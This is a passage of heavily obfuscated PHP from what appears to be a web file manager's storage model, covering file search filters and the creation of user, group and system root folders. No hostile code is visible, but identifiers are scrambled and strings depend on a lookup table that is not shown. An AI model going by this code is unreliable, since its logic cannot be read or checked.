ó›»ÌÅ[32]]) || !is_array($¤Ğª[$ ó›»ÌÅ[564]])) { return; } $½Û†œÇà[$ ó›»ÌÅ[564]] = array($ ó›»ÌÅ[7], $¤Ğª[$ ó›»ÌÅ[564]]); unset($½Û†œÇà[$ ó›»ÌÅ[32]]); unset($¤Ğª[$ ó›»ÌÅ[564]]); $ıÔÃàÄ“ = $this->field($°ûŠç°ù)->where($½Û†œÇà)->limit($ ó›»ÌÅ[2396])->select(); if (!$ıÔÃàÄ“ || count($ıÔÃàÄ“) == 0) { return; } $û¤‚èà­[$ ó›»ÌÅ[446]] = array_merge($ıÔÃàÄ“, $û¤‚èà­[$ ó›»ÌÅ[446]]); $û¤‚èà­[$ ó›»ÌÅ[443]][$ ó›»ÌÅ[444]] += count($ıÔÃàÄ“); } private function _listSearchTag(&$‚ãá×áØ, $…‹ôÓòå, $óğ‰êÕ˜) { $¿ëÍÇ„Ï =& $_SERVER[€ä¾™²]; if (empty($…‹ôÓòå[$¿ëÍÇ„Ï[2090]]) || !in_array($¿ëÍÇ„Ï[2397], $…‹ôÓòå[$¿ëÍÇ„Ï[2090]])) { return; } if (!$…‹ôÓòå[$¿ëÍÇ„Ï[2224]] || $‚ãá×áØ[$¿ëÍÇ„Ï[443]][$¿ëÍÇ„Ï[429]] > 1) { return; } $ÊáÜàÂ = Model($¿ëÍÇ„Ï[2398])->listData(); $‡¯î¤ƒ‚ = array(); $¼¨¸™× = $…‹ôÓòå[$¿ëÍÇ„Ï[2224]]; foreach ($ÊáÜàÂ as $ôıŸßı) { $Ñ–·–¢ü = $ôıŸßı[$¿ëÍÇ„Ï[32]]; $ Áñ”äğ = str_replace($¿ëÍÇ„Ï[53], $¿ëÍÇ„Ï[12], Pinyin::get($Ñ–·–¢ü)); if (stripos($Ñ–·–¢ü, $¼¨¸™×) !== !1 || stripos($ Áñ”äğ, $¼¨¸™×) !== !1) { $‡¯î¤ƒ‚[] = $ôıŸßı[$¿ëÍÇ„Ï[486]]; } } if (!$‡¯î¤ƒ‚) { return; } $“‚¾œà† = array($¿ëÍÇ„Ï[522] => array($¿ëÍÇ„Ï[7], $‡¯î¤ƒ‚), $¿ëÍÇ„Ï[1539] => USER_ID); $Ù…µ¸øÕ = Model($¿ëÍÇ„Ï[524])->field($¿ëÍÇ„Ï[87])->where($“‚¾œà†)->select(); $Ù…µ¸øÕ = array_to_keyvalue($Ù…µ¸øÕ, $¿ëÍÇ„Ï[12], $¿ëÍÇ„Ï[87]); $ÇÃéşÎ = array_unique($Ù…µ¸øÕ); $this->_listSearchMerge($‚ãá×áØ, $…‹ôÓòå, $óğ‰êÕ˜, $ÇÃéşÎ); } private function _listSearchDesc(&$ÏÌú¾©Û, $ö¼šíÔı, $Ä¼ßÎÉ×) { $•˜Èƒ¢Î =& $_SERVER[€ä¾™²]; if (empty($ö¼šíÔı[$•˜Èƒ¢Î[2090]]) || !in_array($•˜Èƒ¢Î[547], $ö¼šíÔı[$•˜Èƒ¢Î[2090]])) { return; } if (!$ö¼šíÔı[$•˜Èƒ¢Î[2224]] || $ÏÌú¾©Û[$•˜Èƒ¢Î[443]][$•˜Èƒ¢Î[429]] > 1) { return; } $…›÷“ = array($•˜Èƒ¢Î[95] => $•˜Èƒ¢Î[547], $•˜Èƒ¢Î[451] => array($•˜Èƒ¢Î[473], $•˜Èƒ¢Î[2226] . $ö¼šíÔı[$•˜Èƒ¢Î[2224]] . $•˜Èƒ¢Î[2226])); $Êİª…¢Ù = !1; if ($Êİª…¢Ù) { $¦£ Ç´ï = $this->listSearchChildren($ö¼šíÔı[$•˜Èƒ¢Î[191]]); $¦£ Ç´ï = array_unique($¦£ Ç´ï); if (!$¦£ Ç´ï) { return; } $…›÷“[$•˜Èƒ¢Î[192]] = array($•˜Èƒ¢Î[7], $¦£ Ç´ï); } $àª˜‹ƒŸ = Model($•˜Èƒ¢Î[471])->field($•˜Èƒ¢Î[192])->where($…›÷“)->limit(5000)->select(); $³ŒÕ¸ = array_to_keyvalue($àª˜‹ƒŸ, $•˜Èƒ¢Î[12], $•˜Èƒ¢Î[192]); $this->_listSearchMerge($ÏÌú¾©Û, $ö¼šíÔı, $Ä¼ßÎÉ×, $³ŒÕ¸); } private function _listSearchGroupTag(&$ÂÃŸ’ÚÀ, $‰ŒßòÚ©, $Œà³ƒÈé) { $ìîÉı‡¹ =& $_SERVER[€ä¾™²]; if (empty($‰ŒßòÚ©[$ìîÉı‡¹[2090]]) || !in_array($ìîÉı‡¹[2397], $‰ŒßòÚ©[$ìîÉı‡¹[2090]])) { return; } if (!$‰ŒßòÚ©[$ìîÉı‡¹[2224]] || $ÂÃŸ’ÚÀ[$ìîÉı‡¹[443]][$ìîÉı‡¹[429]] > 1 || !$‰ŒßòÚ©[$ìîÉı‡¹[191]]) { return; } $Í»÷¿º = $this->sourceInfo($‰ŒßòÚ©[$ìîÉı‡¹[191]]); if (!$Í»÷¿º || $Í»÷¿º[$ìîÉı‡¹[189]] != SourceModel::TYPE_GROUP) { return; } $ú²üêÊï = $Í»÷¿º[$ìîÉı‡¹[596]]; $ÎÚóôÍ¬ = Model($ìîÉı‡¹[2399])->get($ú²üêÊï); $©¬¥àó = array(); $ñŞú¨ó = $‰ŒßòÚ©[$ìîÉı‡¹[2224]]; foreach ($ÎÚóôÍ¬[$ìîÉı‡¹[446]] as $£‰–¼õ±) { $êÄœŸÈ = $£‰–¼õ±[$ìîÉı‡¹[32]]; $†¨¹¯®Ú = str_replace($ìîÉı‡¹[53], $ìîÉı‡¹[12], Pinyin::get($êÄœŸÈ)); if (stripos($êÄœŸÈ, $ñŞú¨ó) !== !1 || stripos($†¨¹¯®Ú, $ñŞú¨ó) !== !1) { $©¬¥àó[] = $£‰–¼õ±[$ìîÉı‡¹[486]]; } } if (!$©¬¥àó) { return; } $ÜæñÑ³á = array($ìîÉı‡¹[522] => array($ìîÉı‡¹[7], $©¬¥àó), $ìîÉı‡¹[1539] => 0, $ìîÉı‡¹[33] => $ìîÉı‡¹[1437] . $ú²üêÊï); $à¯ÎâÙ = Model($ìîÉı‡¹[524])->field($ìîÉı‡¹[87])->where($ÜæñÑ³á)->select(); $à¯ÎâÙ = array_to_keyvalue($à¯ÎâÙ, $ìîÉı‡¹[12], $ìîÉı‡¹[87]); $ºœÖÃŒ = array_unique($à¯ÎâÙ); $this->_listSearchMerge($ÂÃŸ’ÚÀ, $‰ŒßòÚ©, $Œà³ƒÈé, $ºœÖÃŒ); } private function _listSearchMerge(&$Õ£§ë”­, $—Ú±ş, $©ŞĞåÕ…, $ŒÈı€ü¬) { $§ºàÑÆ» =& $_SERVER[€ä¾™²]; if (!$ŒÈı€ü¬) { return; } $Ğ„ŒàØ = array_to_keyvalue($Õ£§ë”­[$§ºàÑÆ»[446]], $§ºàÑÆ»[12], $§ºàÑÆ»[192]); $ê³å†Øş = array_diff($ŒÈı€ü¬, $Ğ„ŒàØ); if (!$ê³å†Øş) { return; } $ô£™„¬ = array($§ºàÑÆ»[192] => array($§ºàÑÆ»[7], $ê³å†Øş)); $ªí¤ÖÌî = $this->field($©ŞĞåÕ…)->where($ô£™„¬)->select(); if (!$ªí¤ÖÌî) { return; } $ÑìÕ’×ç = array(); foreach ($ªí¤ÖÌî as $¤úœŸÔÈ) { if ($this->_listSearchFilter($¤úœŸÔÈ, $—Ú±ş)) { $ÑìÕ’×ç[] = $¤úœŸÔÈ; } } $Õ£§ë”­[$§ºàÑÆ»[446]] = array_merge($ÑìÕ’×ç, $Õ£§ë”­[$§ºàÑÆ»[446]]); $Õ£§ë”­[$§ºàÑÆ»[443]][$§ºàÑÆ»[444]] += count($ÑìÕ’×ç); } private function _listSearchFilter($´ªÓ‘ø, $êúÓ—ÂÃ) { $š¡ëüÊ´ =& $_SERVER[€ä¾™²]; $Å²”Ú² = $´ªÓ‘ø[$š¡ëüÊ´[507]] == $š¡ëüÊ´[91]; if (!strstr($´ªÓ‘ø[$š¡ëüÊ´[611]], $š¡ëüÊ´[50] . $êúÓ—ÂÃ[$š¡ëüÊ´[191]] . $š¡ëüÊ´[50])) { return !1; } if (isset($êúÓ—ÂÃ[$š¡ëüÊ´[508]]) && $êúÓ—ÂÃ[$š¡ëüÊ´[508]] != $š¡ëüÊ´[879]) { if ($êúÓ—ÂÃ[$š¡ëüÊ´[508]] == $š¡ëüÊ´[78] && !$Å²”Ú²) { return !1; } if ($êúÓ—ÂÃ[$š¡ëüÊ´[508]] != $š¡ëüÊ´[78] && $Å²”Ú²) { return !1; } if (!strstr($´ªÓ‘ø[$š¡ëüÊ´[167]], $š¡ëüÊ´[50] . $êúÓ—ÂÃ[$š¡ëüÊ´[508]] . $š¡ëüÊ´[50])) { return !1; } } if (isset($êúÓ—ÂÃ[$š¡ëüÊ´[2400]]) && $êúÓ—ÂÃ[$š¡ëüÊ´[2400]] < $´ªÓ‘ø[$š¡ëüÊ´[79]]) { return !1; } if (isset($êúÓ—ÂÃ[$š¡ëüÊ´[2401]]) && $êúÓ—ÂÃ[$š¡ëüÊ´[2401]] > $´ªÓ‘ø[$š¡ëüÊ´[79]]) { return !1; } if (isset($êúÓ—ÂÃ[$š¡ëüÊ´[691]]) && $êúÓ—ÂÃ[$š¡ëüÊ´[691]] != $´ªÓ‘ø[$š¡ëüÊ´[550]]) { return !1; } return !0; } public function listSearchChildren($ªÙü›™ï, $¤¨éõ† = 5000) { $åœ»µ¢ =& $_SERVER[€ä¾™²]; $¯Æö”¾æ = array(); $Ûì‰ŠÈ” = $this->sourceInfo($ªÙü›™ï); $šÂ¤äÅ’ = array($åœ»µ¢[611] => array($åœ»µ¢[473], $Ûì‰ŠÈ”[$åœ»µ¢[611]] . $Ûì‰ŠÈ”[$åœ»µ¢[192]] . $åœ»µ¢[643])); $Ü”˜ÁãÁ = $this->field($åœ»µ¢[79])->where($šÂ¤äÅ’)->limit($¤¨éõ† + 1)->select(); $”°¹æ†Ç = is_array($Ü”˜ÁãÁ) ? count($Ü”˜ÁãÁ) : 0; if ($”°¹æ†Ç > $¤¨éõ†) { return $this->_listSearchChildrenNear($ªÙü›™ï, $¤¨éõ†); } $×Ö½Çš = $this->field($åœ»µ¢[192])->where($šÂ¤äÅ’)->select(); $¯Æö”¾æ = array_to_keyvalue($×Ö½Çš, $åœ»µ¢[12], $åœ»µ¢[192]); return $¯Æö”¾æ; } private function _listSearchChildrenNear($Ú½ˆùŸ–, $¿÷ç‚®ñ) { $û™õÅ‡² =& $_SERVER[€ä¾™²]; $ÏÕûîåì = array(); $¶¸üÇãù = array($û™õÅ‡²[191] => $Ú½ˆùŸ–); $¢Ç¦ñ… = $this->field($û™õÅ‡²[2402])->where($¶¸üÇãù)->select(); $¸÷‡óƒ‘ = array_to_keyvalue(array_filter_by_field($¢Ç¦ñ…, $û™õÅ‡²[507], $û™õÅ‡²[91]), $û™õÅ‡²[12], $û™õÅ‡²[192]); $ÏÕûîåì = array_merge($ÏÕûîåì, array_to_keyvalue($¢Ç¦ñ…, $û™õÅ‡²[12], $û™õÅ‡²[192])); if (!$¸÷‡óƒ‘) { return $ÏÕûîåì; } $¶¸üÇãù = array($û™õÅ‡²[191] => array($û™õÅ‡²[7], $¸÷‡óƒ‘)); $¢Ç¦ñ… = $this->field($û™õÅ‡²[2402])->where($¶¸üÇãù)->limit($¿÷ç‚®ñ)->select(); $ÏÕûîåì = array_merge($ÏÕûîåì, array_to_keyvalue($¢Ç¦ñ…, $û™õÅ‡²[12], $û™õÅ‡²[192])); $ÏÕûîåì = array_slice($ÏÕûîåì, 0, intval($¿÷ç‚®ñ)); return $ÏÕûîåì; } private function _listSearchBindPinyin($ÜÇì›äç, &$ÅÜÊÆĞ·, &$±‹²¦) { $èš£¬°ã =& $_SERVER[€ä¾™²]; if (!isset($ÜÇì›äç[$èš£¬°ã[2224]]) || !$ÜÇì›äç[$èš£¬°ã[2224]]) { return; } if (!Input::check($ÜÇì›äç[$èš£¬°ã[2224]], $èš£¬°ã[394]) || strlen($ÜÇì›äç[$èš£¬°ã[2224]]) < 2) { return; } $Î‚£ÁÚì = "\x4c\105\x46\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\137\x73\x6f\165\x72\x63\145\137\x6d\145\x74\x61\x20\x6d\145\x74\x61\x20\157\156\40\163\157\165\162\x63\145\x2e\163\x6f\x75\162\143\x65\111\104\x20\x3d\x20\x6d\145\x74\x61\x2e\x73\x6f\x75\162\x63\145\111\104"; $Ãö´£‹ò = array(); $±‹²¦ = str_replace(array($èš£¬°ã[286], $èš£¬°ã[53], $èš£¬°ã[2403]), $èš£¬°ã[12], $±‹²¦); $±‹²¦ = $èš£¬°ã[532] . str_replace($èš£¬°ã[50], $èš£¬°ã[533], $±‹²¦); $”åèñ™² = $ÅÜÊÆĞ·[$èš£¬°ã[32]]; unset($ÅÜÊÆĞ·[$èš£¬°ã[32]]); foreach ($ÅÜÊÆĞ· as $ü“ñŞ‚ => $İÄ„µéÎ) { $Ãö´£‹ò[$èš£¬°ã[532] . $ü“ñŞ‚] = $İÄ„µéÎ; } foreach ($”åèñ™² as $ß„å‰ü) { $Ãö´£‹ò[] = array($èš£¬°ã[537] => $ß„å‰ü, $èš£¬°ã[1113] => $èš£¬°ã[2228], array($èš£¬°ã[2404] => $ß„å‰ü, $èš£¬°ã[2405] => array($èš£¬°ã[7], array($èš£¬°ã[559], $èš£¬°ã[558])))); } $this->join($Î‚£ÁÚì); $ÅÜÊÆĞ· = $Ãö´£‹ò; } private function _parseSearchWhere($¡Í—ë¨‘) { $Çû¡…ü­ =& $_SERVER[€ä¾™²]; $¸ÅËšÖû = array(); if (isset($¡Í—ë¨‘[$Çû¡…ü­[861]]) && $¡Í—ë¨‘[$Çû¡…ü­[861]]) { $¸ÅËšÖû[$Çû¡…ü­[88]] = array($Çû¡…ü­[2406], $¡Í—ë¨‘[$Çû¡…ü­[861]]); } if (isset($¡Í—ë¨‘[$Çû¡…ü­[862]]) && $¡Í—ë¨‘[$Çû¡…ü­[862]]) { $¼ÄŞ»¶Æ = array($Çû¡…ü­[2407], $¡Í—ë¨‘[$Çû¡…ü­[862]]); if ($¸ÅËšÖû[$Çû¡…ü­[88]]) { $¸ÅËšÖû[$Çû¡…ü­[88]] = array($¸ÅËšÖû[$Çû¡…ü­[88]], $¼ÄŞ»¶Æ, $Çû¡…ü­[2408]); } else { $¸ÅËšÖû[$Çû¡…ü­[88]] = $¼ÄŞ»¶Æ; } } if (isset($¡Í—ë¨‘[$Çû¡…ü­[2400]]) && $¡Í—ë¨‘[$Çû¡…ü­[2400]] > 0) { $¸ÅËšÖû[$Çû¡…ü­[79]] = array($Çû¡…ü­[2406], $¡Í—ë¨‘[$Çû¡…ü­[2400]]); } if (isset($¡Í—ë¨‘[$Çû¡…ü­[2401]]) && $¡Í—ë¨‘[$Çû¡…ü­[2401]]) { $¼ÄŞ»¶Æ = array($Çû¡…ü­[2407], $¡Í—ë¨‘[$Çû¡…ü­[2401]]); if ($¸ÅËšÖû[$Çû¡…ü­[79]]) { $¸ÅËšÖû[$Çû¡…ü­[79]] = array($¸ÅËšÖû[$Çû¡…ü­[79]], $¼ÄŞ»¶Æ, $Çû¡…ü­[2408]); } else { $¸ÅËšÖû[$Çû¡…ü­[79]] = $¼ÄŞ»¶Æ; } } if (isset($¡Í—ë¨‘[$Çû¡…ü­[691]]) && $¡Í—ë¨‘[$Çû¡…ü­[691]]) { $¸ÅËšÖû[] = array($Çû¡…ü­[550] => $¡Í—ë¨‘[$Çû¡…ü­[691]], $Çû¡…ü­[548] => $¡Í—ë¨‘[$Çû¡…ü­[691]], $Çû¡…ü­[1113] => $Çû¡…ü­[2228]); } if (isset($¡Í—ë¨‘[$Çû¡…ü­[508]]) && $¡Í—ë¨‘[$Çû¡…ü­[508]]) { $©“î“áÔ = $¡Í—ë¨‘[$Çû¡…ü­[508]]; if ($©“î“áÔ == $Çû¡…ü­[78]) { $¸ÅËšÖû[$Çû¡…ü­[507]] = 1; } else { if ($©“î“áÔ == $Çû¡…ü­[2409]) { $¸ÅËšÖû[$Çû¡…ü­[507]] = 0; } else { if ($©“î“áÔ) { $©“î“áÔ = is_array($©“î“áÔ) ? $©“î“áÔ : explode($Çû¡…ü­[50], $©“î“áÔ); $¸ÅËšÖû[$Çû¡…ü­[508]] = array($Çû¡…ü­[514], $©“î“áÔ); $¸ÅËšÖû[$Çû¡…ü­[507]] = 0; } } } } $this->_parseSearchParent($¡Í—ë¨‘, $¸ÅËšÖû); if (isset($¡Í—ë¨‘[$Çû¡…ü­[2224]]) && trim($¡Í—ë¨‘[$Çû¡…ü­[2224]])) { $“ïº©ıµ = trim($¡Í—ë¨‘[$Çû¡…ü­[2224]]); $·¥²Õí¶ = explode($Çû¡…ü­[53], $“ïº©ıµ); if (strlen($“ïº©ıµ) > 2 && (substr($“ïº©ıµ, 0, 1) == $Çû¡…ü­[119] && substr($“ïº©ıµ, -1) == $Çû¡…ü­[119]) || substr($“ïº©ıµ, 0, 1) == $Çû¡…ü­[58] && substr($“ïº©ıµ, -1) == $Çû¡…ü­[58]) { $“ïº©ıµ = substr($“ïº©ıµ, 1, -1); $·¥²Õí¶ = array($“ïº©ıµ); } $¸ÅËšÖû[$Çû¡…ü­[32]] = array(array($Çû¡…ü­[642], $Çû¡…ü­[2226] . $“ïº©ıµ . $Çû¡…ü­[2226])); if (count($·¥²Õí¶) > 1) { $¸ÅËšÖû[$Çû¡…ü­[32]] = array(); foreach ($·¥²Õí¶ as $ç»‰û“›) { if (!trim($ç»‰û“›)) { continue; } $¸ÅËšÖû[$Çû¡…ü­[32]][] = array($Çû¡…ü­[642], $Çû¡…ü­[2226] . trim($ç»‰û“›) . $Çû¡…ü­[2226]); } } } return $¸ÅËšÖû; } private function _parseSearchParent($†˜Ëı°Ò, &$ù‹¿²Äï) { $ÈŞäüø¼ =& $_SERVER[€ä¾™²]; if (!isset($†˜Ëı°Ò[$ÈŞäüø¼[191]]) || !$†˜Ëı°Ò[$ÈŞäüø¼[191]]) { return; } $²¯È¯ = $this->pathInfo($†˜Ëı°Ò[$ÈŞäüø¼[191]]); $ì³äÂ…ó = $²¯È¯[$ÈŞäüø¼[191]] . $ÈŞäüø¼[12] === $ÈŞäüø¼[229]; $ãÜ¤ÔÙ = $²¯È¯[$ÈŞäüø¼[189]] == $ÈŞäüø¼[605]; if ($²¯È¯[$ÈŞäüø¼[621]] == $ÈŞäüø¼[622]) { $ú£š‰Â = $this->sourceInfo($†˜Ëı°Ò[$ÈŞäüø¼[191]]); $²¯È¯[$ÈŞäüø¼[611]] = $ú£š‰Â[$ÈŞäüø¼[611]]; } $ù‹¿²Äï[$ÈŞäüø¼[681]] = array($ÈŞäüø¼[642], $²¯È¯[$ÈŞäüø¼[611]] . $†˜Ëı°Ò[$ÈŞäüø¼[191]] . $ÈŞäüø¼[643]); $Ï—ä•‘ü = isset($†˜Ëı°Ò[$ÈŞäüø¼[2090]]) && in_array($ÈŞäüø¼[605], $†˜Ëı°Ò[$ÈŞäüø¼[2090]]); if (!$Ï—ä•‘ü || !$ãÜ¤ÔÙ || !$ì³äÂ…ó || !$²¯È¯[$ÈŞäüø¼[509]]) { return; } if (!AuthModel::authCheckRoot($²¯È¯[$ÈŞäüø¼[509]][$ÈŞäüø¼[510]])) { return; } $˜¦‚ìéÙ = $²¯È¯[$ÈŞäüø¼[596]] . $ÈŞäüø¼[12]; if ($˜¦‚ìéÙ == $ÈŞäüø¼[91]) { unset($ù‹¿²Äï[$ÈŞäüø¼[681]]); $ù‹¿²Äï[$ÈŞäüø¼[189]] = self::TYPE_GROUP; return; } $á…ÑÄà± = Model($ÈŞäüø¼[612])->groupChildrenAll($˜¦‚ìéÙ); $Š‚ÅÃ© = count($á…ÑÄà±); if ($Š‚ÅÃ© <= 1) { return; } $„ŞÊ¾ = array($ÈŞäüø¼[191] => 0, $ÈŞäüø¼[189] => self::TYPE_GROUP, $ÈŞäüø¼[596] => array($ÈŞäüø¼[7], $á…ÑÄà±)); $¯„şÙÁ = $this->field($ÈŞäüø¼[2410])->where($„ŞÊ¾)->limit($Š‚ÅÃ©)->select(); $ù‹¿²Äï[$ÈŞäüø¼[681]] = array(); foreach ($¯„şÙÁ as $ß°§ª÷Ş) { $ù‹¿²Äï[$ÈŞäüø¼[681]][] = array($ÈŞäüø¼[642], $ÈŞäüø¼[620] . $ß°§ª÷Ş[$ÈŞäüø¼[192]] . $ÈŞäüø¼[643]); } $ù‹¿²Äï[$ÈŞäüø¼[681]][] = $ÈŞäüø¼[2228]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Šéç¯’Õ) { $ûùŞ±•Í =& $_SERVER[€ä¾™²]; $øš˜†‚Š = Model($ûùŞ±•Í[604])->where(array($ûùŞ±•Í[1913] => $Šéç¯’Õ))->find(); $ïÃõ¶ŞØ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Šéç¯’Õ, $øš˜†‚Š[$ûùŞ±•Í[32]]); $this->userDesktopAdd($ïÃõ¶ŞØ); return $ïÃõ¶ŞØ; } public function userDesktopAdd($÷¤êÖ©Î) { $ßë”–˜ =& $_SERVER[€ä¾™²]; $£•ó = LNG($ßë”–˜[2411]); $ËˆãØŒ = $this->mkdir($÷¤êÖ©Î, $£•ó); $this->metaSet($ËˆãØŒ, $ßë”–˜[2412], $ßë”–˜[91]); $this->metaSet($÷¤êÖ©Î, $ßë”–˜[2413], $ËˆãØŒ); } public function userPathSafeAdd($µÚóŒ²) { $ü—¥ƒÇû =& $_SERVER[€ä¾™²]; $éïà’ƒï = Model($ü—¥ƒÇû[604])->getInfoFull($µÚóŒ²); if (!$éïà’ƒï) { return !1; } if (_get($éïà’ƒï, $ü—¥ƒÇû[625])) { return $éïà’ƒï[$ü—¥ƒÇû[562]][$ü—¥ƒÇû[2414]]; } $Îø«Ü† = $this->_mkdirRoot(SourceModel::TYPE_USER, $µÚóŒ², $ü—¥ƒÇû[2415], $ü—¥ƒÇû[2416]); Model($ü—¥ƒÇû[604])->metaSet($µÚóŒ², $ü—¥ƒÇû[2414], $Îø«Ü†); $this->metaSet($Îø«Ü†, $ü—¥ƒÇû[2417], $µÚóŒ²); return $Îø«Ü†; } public function userPathAppAdd($üùéö‚ç, $Éñ¸á³» = '', $Ãíï…¤• = '') { $µùñ¾– =& $_SERVER[€ä¾™²]; $½ şüûŠ = Model($µùñ¾–[604])->getInfoFull($üùéö‚ç); if (!$½ şüûŠ) { return !1; } $·‘ñİ®¹ = $½ şüûŠ[$µùñ¾–[562]] ? $½ şüûŠ[$µùñ¾–[562]] : array(); $µœğˆ¬í = $·‘ñİ®¹[$µùñ¾–[2418]]; if (!$µœğˆ¬í) { $µœğˆ¬í = $this->_mkdirRoot(SourceModel::TYPE_USER, $üùéö‚ç, $µùñ¾–[2419], $µùñ¾–[2420]); Model($µùñ¾–[604])->metaSet($üùéö‚ç, $µùñ¾–[2418], $µœğˆ¬í . $µùñ¾–[12]); $this->metaSet($µœğˆ¬í, $µùñ¾–[2418], $üùéö‚ç); } if (!$Éñ¸á³») { return $µœğˆ¬í; } $×ºãÛ¦Ø = $·‘ñİ®¹[$µùñ¾–[2421] . $Éñ¸á³»]; if (!$×ºãÛ¦Ø) { $×ºãÛ¦Ø = $this->mkdir($µœğˆ¬í, $Éñ¸á³»); Model($µùñ¾–[604])->metaSet($üùéö‚ç, $µùñ¾–[2421] . $Éñ¸á³», $×ºãÛ¦Ø); $this->metaSet($×ºãÛ¦Ø, $µùñ¾–[2421] . $Éñ¸á³», $üùéö‚ç); } if (!$Ãíï…¤•) { return $×ºãÛ¦Ø; } $óšÃğğ = $this->mkdir($×ºãÛ¦Ø, $Ãíï…¤•); return $óšÃğğ; } public function groupRootAdd($ÔƒÛŸâ¥) { $ì½Û„æı =& $_SERVER[€ä¾™²]; $®–ÜÊ¼ = Model($ì½Û„æı[612])->where(array($ì½Û„æı[2213] => $ÔƒÛŸâ¥))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÔƒÛŸâ¥, $®–ÜÊ¼[$ì½Û„æı[32]]); } public function systemRootPathAdd($³ÌîÒ×) { if ($³ÌîÒ× != $_SERVER[€ä¾™²][635]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $³ÌîÒ×); } public function userRootRemove($´£ôòã§) { $ôµ£Æğ¿ = $this->targetSourceRoot(SourceModel::TYPE_USER, $´£ôòã§, !0); foreach ($ôµ£Æğ¿ as $ Ùƒ™Ç) { if (!$ Ùƒ™Ç) { continue; } $this->remove($ Ùƒ™Ç[$_SERVER[€ä¾™²][192]], !1); } } public function groupRootRemove($šŠúÒ•À) { $ıÏºèö“ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $šŠúÒ•À); if (!$ıÏºèö“) { return; } $this->remove($ıÏºèö“[$_SERVER[€ä¾™²][192]], !1); } private function _mkdirRoot($Á…ûÕí, $äïŸÛ, $˜À¼Õú , $ÈíŞïÅû = '') { $ÜçÓñÀ× =& $_SERVER[€ä¾™²]; $ÔÜ¨ş®§ = KodUser::id(); $Ø—¨éë = array($ÜçÓñÀ×[499] => 0, $ÜçÓñÀ×[677] => $Á…ûÕí, $ÜçÓñÀ×[678] => $äïŸÛ, $ÜçÓñÀ×[675] => 1, $ÜçÓñÀ×[679] => $ÔÜ¨ş®§, $ÜçÓñÀ×[680] => $ÔÜ¨ş®§, $ÜçÓñÀ×[676] => $ÈíŞïÅû, $ÜçÓñÀ×[681] => $ÜçÓñÀ×[620], $ÜçÓñÀ×[526] => 0, $ÜçÓñÀ×[647] => 0, $ÜçÓñÀ×[565] => 0, $ÜçÓñÀ×[682] => $ÜçÓñÀ×[12]); if ($òğÄƒäø = $this->where($Ø—¨éë)->find()) { return $òğÄƒäø[$ÜçÓñÀ×[192]]; } $‡´è‰ñ¢ = "\x4d\157\x64\x65\154\123\157\x75\x72\143\x65\56\x6d\x6b\x64\x69\x72\x52\157\157\x74\56{$Á…ûÕí}\56{$äïŸÛ}\56" . $˜À¼Õú ; CacheLock::lock($‡´è‰ñ¢); $Ø—¨éë[$ÜçÓñÀ×[32]] = $˜À¼Õú ; $ºÈò = $this->add($Ø—¨éë); $üşèÅ³Œ = array($ÜçÓñÀ×[683] => short_id($ºÈò)); $this->where(array($ÜçÓñÀ×[513] => $ºÈò))->save($üşèÅ³Œ); CacheLock::unlock($‡´è‰ñ¢); return $ºÈò; } private function targetSourceRoot($Ö–‹›, $ØåÔîØÊ, $½…Çß× = false) { $ıŠšÚû¦ =& $_SERVER[€ä¾™²]; $óÙ”ÏÜî = array($ıŠšÚû¦[499] => 0, $ıŠšÚû¦[677] => $Ö–‹›, $ıŠšÚû¦[678] => $ØåÔîØÊ); if ($½…Çß×) { $¨ÊˆÌèú = $this->where($óÙ”ÏÜî)->select(); return $¨ÊˆÌèú ? $¨ÊˆÌèú : array(); } $ğ÷İÓ¡Â = $this->where($óÙ”ÏÜî)->find(); return $ğ÷İÓ¡Â ? $ğ÷İÓ¡Â : array(); } public function sourceRootGroup($ˆñ‹¿Œ) { $¨¤ñòù• =& $_SERVER[€ä¾™²]; if (is_string($ˆñ‹¿Œ)) { $ˆñ‹¿Œ = array($ˆñ‹¿Œ); } $ÂÏà”“ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ˆñ‹¿Œ, $¨¤ñòù•[221]); $ãúœ šĞ = array($¨¤ñòù•[446] => $ÂÏà”“, $¨¤ñòù•[443] => array($¨¤ñòù•[859] => count($ˆñ‹¿Œ))); $this->_listDataApply($ãúœ šĞ[$¨¤ñòù•[446]]); $this->_listMake($ãúœ šĞ); return array_to_keyvalue($ãúœ šĞ[$¨¤ñòù•[85]], $¨¤ñòù•[596]); } public function mkfile($¥‚«‹À÷, $¶°Î´ô¹, $¹Ù£­şõ = '', $•¿Î™Ê = REPEAT_RENAME) { $¬‘”û‘ =& $_SERVER[€ä¾™²]; $—Ó˜åÂŸ = KodIO::ioFileDriverGet($¬‘”û‘[505] . $¥‚«‹À÷ . $¬‘”û‘[403]); $ô‹şÎñÁ = Model($¬‘”û‘[703])->addFileByContent($¹Ù£­şõ, $—Ó˜åÂŸ, $¶°Î´ô¹); return $this->_createFileCall($¥‚«‹À÷, $¶°Î´ô¹, $ô‹şÎñÁ, $•¿Î™Ê, $¬‘”û‘[1489]); } public function addFile($ñîíªÛÈ, $Š—´µù†, $ëÄçÄ­˜, $›Èµšå = false, $µ£î†İ• = REPEAT_RENAME) { $©å˜±² =& $_SERVER[€ä¾™²]; $¹Ú†Ã²á = KodIO::ioFileDriverGet($©å˜±²[505] . $ñîíªÛÈ . $©å˜±²[403]); $€Ó”åÓ€ = Model($©å˜±²[703])->addFile($Š—´µù†, $¹Ú†Ã²á, $ëÄçÄ­˜, $›Èµšå); return $this->_createFileCall($ñîíªÛÈ, $ëÄçÄ­˜, $€Ó”åÓ€, $µ£î†İ•); } public function addFileByFileID($èˆ­Û£, $¥Ğ©è€Ç, $¹ê¨¸é€, $ÔÊŞ —¶ = REPEAT_RENAME) { $Âë€½µ¿ =& $_SERVER[€ä¾™²]; $Àğ””¼€ = Model($Âë€½µ¿[703])->find($¥Ğ©è€Ç); Model($Âë€½µ¿[703])->linkAdd($¥Ğ©è€Ç); return $this->_createFileCall($èˆ­Û£, $¹ê¨¸é€, $Àğ””¼€, $ÔÊŞ —¶); } public function addFileByRemote($ğÛ†¿õ, $ÙÂÎäåƒ, $”¡Íòöî, $ñ › ££ = array(), $ßå‰æ¯õ = REPEAT_RENAME) { $üÀœÖ™… = Model($_SERVER[€ä¾™²][703])->addFileByRemote($ÙÂÎäåƒ, $”¡Íòöî, $ñ › ££); return 